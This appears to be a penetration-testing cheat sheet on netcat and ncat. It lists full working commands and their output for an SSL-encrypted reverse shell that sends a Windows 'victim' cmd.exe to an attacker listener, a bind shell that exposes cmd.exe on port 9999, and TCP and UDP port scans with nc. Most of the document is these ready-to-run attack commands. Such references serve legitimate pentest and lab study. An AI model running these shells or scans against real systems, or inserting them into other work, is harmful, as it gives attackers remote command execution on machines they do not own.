---
tags: [backdoor,network,scanner]
---
# Ncat / nc

## References

Netcat (`nc` binary) is a simple Unix utility which reads and writes data
across network connections, using TCP or UDP protocol. It can be used to open
bind and reverse shells.

Ncat (`ncat` binary) is a much-improved reimplementation of netcat, it's a
Nmap Project. Ncat added cipher support, IP restriction, option to serve
binaries over network, chaining, redirection, proxy connection.

- netcat (`nc`): http://nc110.sourceforge.net/
- `ncat`: https://nmap.org/ncat/

## Encrypted reverse shell from windows to the attacker machine:

Attacker machine:

```
$ ncat -vnl 9999 --allow 10.0.0.1 --ssl 
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 7B3E A579 1B50 C74C 35FE 7FD5 7D9D 991C 60D6 4F75
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
```

From windows victim:

```
C:\Users\Administrator\Desktop\Tools\ncat>ncat.exe --exec cmd.exe -vn 10.0.0.254 9999 --ssl
Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
Ncat: SSL connection to 10.0.0.254:9999.
Ncat: SHA-1 fingerprint: 7B3E A579 1B50 C74C 35FE 7FD5 7D9D 991C 60D6 4F75
```

## Unencrypted bind shell from windows to the attacker machine:

From windows victim:

```
C:\Users\Administrator\Desktop\Tools\ncat>ncat.exe --exec cmd.exe -vnl 9999 --allow 10.0.0.254
Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.0.0.254:35218.
```

Attacker machine:

```
$ nc 10.0.0.1 9999
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator\Desktop\Tools\ncat>
```

## Port scanning with nc

CONNECT TCP method:

```
$ nc -nvv -w 1 -z 192.168.0.1 3388-3390
192.168.0.1 3388 (cbserver): Connection refused
192.168.0.1 3389 (ms-wbt-server): Connection refused
192.168.0.1 3390 (dsc): Connection refused
Total received bytes: 0
Total sent bytes: 0
```

UDP scan:

```
$ nc -nvv -w 1 -z -u 192.168.0.1 160-162  
Total received bytes: 0
Total sent bytes: 0
```
